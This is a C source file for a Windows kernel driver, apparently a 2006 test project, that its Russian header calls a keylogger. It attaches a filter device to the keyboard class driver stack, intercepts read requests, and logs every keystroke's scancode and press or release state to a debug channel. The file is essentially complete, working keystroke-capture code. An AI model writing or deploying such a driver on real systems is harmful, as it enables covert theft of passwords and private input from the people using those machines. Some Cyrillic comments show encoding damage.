/********************************************************************
	created:	2006/03/17
	created:	17:3:2006   13:50
	filename: 	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kd4\kd4.c
	file path:	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kd4
	file base:	kd4
	file ext:	c
	author:		јндрей √руздев
	
	purpose:	кейлоггер - фильтр на драйвер класса клавиатуры
*********************************************************************/

#include <ntifs.h>
#include <ntddkbd.h>

#include "..\kdprint\kernel\kdprint.h"
#include "..\kdprint\kdctl.h"

typedef
struct _KD_EXTENSION
{
	PDEVICE_OBJECT	m_pLowerDeviceObject;
	PFILE_OBJECT	m_pLowerFileObject;
} KD_EXTENSION, *PKD_EXTENSION;

volatile LONG gSysEnters = 0;
volatile BOOLEAN g_bUnload = FALSE;
PDEVICE_OBJECT g_pDeviceObject = NULL;
PDEVICE_OBJECT g_pControlDeviceObject = NULL;

NTSTATUS NTAPI KDReadCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PKEYBOARD_INPUT_DATA KeyData;
	ULONG KeyCount;
	ULONG i;

	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		KeyCount = Irp->IoStatus.Information/sizeof(KEYBOARD_INPUT_DATA);

		for(i = 0; i < KeyCount; i++)
		{
			KDPrint("kd4.sys: key SCANCODE:%d ", KeyData[i].MakeCode);

			if (KeyData[i].Flags == KEY_MAKE)
				KDPrint("pressed");
			
			if (KeyData[i].Flags & KEY_BREAK)
				KDPrint("released");
			if (KeyData[i].Flags & KEY_E0)
				KDPrint(" E0 flag");
			if (KeyData[i].Flags & KEY_E1)
				KDPrint(" E1 flag");

			KDPrint("\n");
		}
	}

	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	ObDereferenceObject(DeviceObject);
	InterlockedDecrement((PLONG)&gSysEnters);

	return STATUS_SUCCESS;
}

NTSTATUS NTAPI KDDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);

// необрабатываемые запросы на наш управл€ющий девайс(MJ_CREATE..) завершаем с успехом
	if (IrpSp->DeviceObject == g_pControlDeviceObject)
	{
		Irp->IoStatus.Information = 0;
		Irp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);

		return STATUS_SUCCESS;
	}

	if (!g_bUnload)
	{
		switch (IrpSp->MajorFunction)
		{
		case IRP_MJ_READ:
// чтоб драйвер не выгрузилс€ до конца CompletionRoutine
			ObReferenceObject(DeviceObject);
			InterlockedIncrement((PLONG)&gSysEnters);

			IoCopyCurrentIrpStackLocationToNext(Irp);
			IoSetCompletionRoutine(Irp, KDReadCompletion, NULL, TRUE, TRUE, TRUE);
			
			break;
		default:
			IoSkipCurrentIrpStackLocation(Irp);
		}
	}
	else
	{
		IoSkipCurrentIrpStackLocation(Irp);
	}

	return IoCallDriver(((PKD_EXTENSION)DeviceObject->DeviceExtension)->m_pLowerDeviceObject, Irp);
}

NTSTATUS NTAPI KDDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);

	if (IrpSp->DeviceObject == g_pControlDeviceObject)
	{
		NTSTATUS ntStatus;

		ntStatus = STATUS_INVALID_DEVICE_REQUEST;

		if (IrpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_INIT_KDPRINT)
		{
			if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(KDPRINT_INIT_INPARAM))
			{
				ntStatus = KDPrintInit(	((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSectionMutant,
										((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSection);
			}
		}

		Irp->IoStatus.Information = 0;
		Irp->IoStatus.Status = ntStatus;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);

		return ntStatus;
	}

	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(((PKD_EXTENSION)DeviceObject->DeviceExtension)->m_pLowerDeviceObject, Irp);
}

NTSTATUS NTAPI KDShutdown(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	UNICODE_STRING cntdControlSymlinkName;
	
// ждем выхода из completionroutine
	g_bUnload = TRUE;

	IoDetachDevice(((PKD_EXTENSION)g_pDeviceObject->DeviceExtension)->m_pLowerDeviceObject);
	ObDereferenceObject(((PKD_EXTENSION)g_pDeviceObject->DeviceExtension)->m_pLowerFileObject);
	IoDeleteDevice(g_pDeviceObject);

	return STATUS_SUCCESS;
}

VOID NTAPI KDUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING cntdControlSymlinkName;
	
	LARGE_INTEGER ExpireTime;
// ждем выхода из completionroutine
	g_bUnload = TRUE;

	ExpireTime.QuadPart = -1000000L;	// 100 msec
	while (gSysEnters)
		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);

	IoDetachDevice(((PKD_EXTENSION)g_pDeviceObject->DeviceExtension)->m_pLowerDeviceObject);
	ObDereferenceObject(((PKD_EXTENSION)g_pDeviceObject->DeviceExtension)->m_pLowerFileObject);
	IoDeleteDevice(g_pDeviceObject);

	KDPrintUnInit();

	RtlInitUnicodeString(&cntdControlSymlinkName, K_CONTROL_SYMLINK_NAME(KD4));
	IoDeleteSymbolicLink(&cntdControlSymlinkName);
	IoDeleteDevice(g_pControlDeviceObject);

	KDPrint("kd4.sys: unloaded..\n");
}

NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS ntStatus;
	UNICODE_STRING cntdKbdClassStr;
	PFILE_OBJECT pFileObject;
	PDEVICE_OBJECT pLowerDeviceObject;
	PDEVICE_OBJECT pDeviceObject;
	ULONG i;
	UNICODE_STRING cntdControlDeviceName;
	PDEVICE_OBJECT pControlDeviceObject;
	UNICODE_STRING cntdControlSymlinkName;

	DriverObject->DriverUnload = KDUnload;

// повесим все на один хэндлер..
	for ( i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = KDDispatch;
// кроме DeviceIoControl'а..
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KDDeviceControl;
// и shutdown'а
	DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = KDShutdown;

	RtlInitUnicodeString(&cntdControlDeviceName, K_CONTROL_DEVICE_NAME(KD4));
	ntStatus = IoCreateDevice(DriverObject, 0, &cntdControlDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pControlDeviceObject);
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;
	pControlDeviceObject->Flags |= DO_BUFFERED_IO;
// symbolic link
	RtlInitUnicodeString(&cntdControlSymlinkName, K_CONTROL_SYMLINK_NAME(KD4));
	ntStatus = IoCreateSymbolicLink(&cntdControlSymlinkName, &cntdControlDeviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(pControlDeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	RtlInitUnicodeString(&cntdKbdClassStr, L"\\Device\\KeyboardClass0");
	ntStatus = IoGetDeviceObjectPointer(&cntdKbdClassStr, 0, &pFileObject, &pLowerDeviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(pControlDeviceObject);
		return STATUS_UNSUCCESSFUL;
	}
// безым€нный девайс..
	ntStatus = IoCreateDevice(DriverObject, sizeof(KD_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0,
		FALSE, &pDeviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(pControlDeviceObject);
		ObDereferenceObject(pFileObject);

		return STATUS_UNSUCCESSFUL;
	}

	((PKD_EXTENSION)pDeviceObject->DeviceExtension)->m_pLowerDeviceObject = pLowerDeviceObject;
	((PKD_EXTENSION)pDeviceObject->DeviceExtension)->m_pLowerFileObject = pFileObject;
// keyboardclassx использует buffered io
	pDeviceObject->Flags |= DO_BUFFERED_IO;
// аттачимс€ в стек..
	if (!IoAttachDeviceToDeviceStack(pDeviceObject, pLowerDeviceObject))
	{
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(pControlDeviceObject);
		IoDeleteDevice(pDeviceObject);
		ObDereferenceObject(pFileObject);

		return STATUS_UNSUCCESSFUL;
	}

// регистрим шатдаун нотификацию на контрол-девайс
	ntStatus = IoRegisterShutdownNotification(pControlDeviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDetachDevice(pLowerDeviceObject);
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(pControlDeviceObject);
		IoDeleteDevice(pDeviceObject);
		ObDereferenceObject(pFileObject);

		return STATUS_UNSUCCESSFUL;
	}

// сохран€ем девайсы глобально дл€ доступа из Unload'ов
	g_pDeviceObject = pDeviceObject;
	g_pControlDeviceObject = pControlDeviceObject;

	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	pControlDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	KDPrint("kd4.sys: loaded..\n");

	return STATUS_SUCCESS;
}
